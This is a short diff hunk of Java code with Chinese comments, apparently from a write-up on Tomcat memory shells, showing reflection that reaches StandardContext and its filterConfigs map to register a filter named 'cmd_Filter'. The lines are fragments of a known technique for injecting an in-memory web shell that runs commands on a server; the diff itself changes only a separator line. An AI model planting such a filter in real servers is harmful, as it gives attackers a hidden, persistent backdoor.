@@ -234,7 +234,7 @@ ServletContext servletContext = request.getSession().getServletContext();//先�
  stdctx.setAccessible(true);  
  StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
   
-  
+ ------------------------------------------------------------------------ 
   //拿到filterConfigs这个Map
  String FilterName = "cmd_Filter";  
  Configs = standardContext.getClass().getDeclaredField("filterConfigs");  
